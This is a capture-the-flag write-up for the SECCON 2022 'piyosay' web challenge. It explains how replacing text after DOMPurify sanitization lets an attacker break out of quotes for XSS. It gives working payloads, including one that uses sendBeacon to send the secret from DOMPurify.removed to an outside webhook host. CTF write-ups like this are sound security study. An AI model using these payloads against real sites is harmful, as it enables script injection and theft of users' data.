# piyosay writeup | SECCON 2022
> I know the combination of DOMPurify and Trusted Types is a perfect defense for XSS attacks.
> 
> http://piyosay.seccon.games:3000

## Quick overview

There is a [Trusted Types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types) policy for creating HTMLs which makes use of [DOMPurify](https://github.com/cure53/DOMPurify). 

```js
    trustedTypes.createPolicy("default", {
      createHTML: (unsafe) => {
        return DOMPurify.sanitize(unsafe)
          .replace(/SECCON{.+}/g, () => {
            // Delete a secret in RegExp
            "".match(/^$/);
            return "SECCON{REDACTED}";
          });
      },
    });
``` 

However, there is a bug that replaces flag with `SECCON{REDACTED}` and we can abuse it to escape from quotes. Imagine a safe code like: 
```html
SECCON{<img id="}
  <style/onload=alert()>">
```

After replacement, it will become:

```html
SECCON{REDACTED}
<style/onload=alert()>">
```

which is an XSS - http://piyosay.seccon.games:3000/result?message=asdSECCON{%3Cimg+id%3D%22}%0a%3Cstyle/onload=alert()%3E%22%3E.

However, the flag is removed from the cookie so we need to somehow access it. We found out that `DOMPurify.removed` will contain the removed flag, so we just read it and sent to our server, with:

```html
SECCON{<img id='}
  <style/onload=navigator.sendBeacon("https://server/leak",DOMPurify.removed[0].element.innerText>'><iframe>
```

After sending `http://web:3000/result?message=SECCON{<img/id='}%0a<style/onload=navigator.sendBeacon("https://webhook.site/e1898219-2d03-4382-85a7-f9ef118f90a3",DOMPurify.removed[0].element.innerText)>'><iframe>` to the bot, we've got the flag:

**SECCON{w0w_yoU_div3d_deeeeeep_iNto_DOMPurify}**
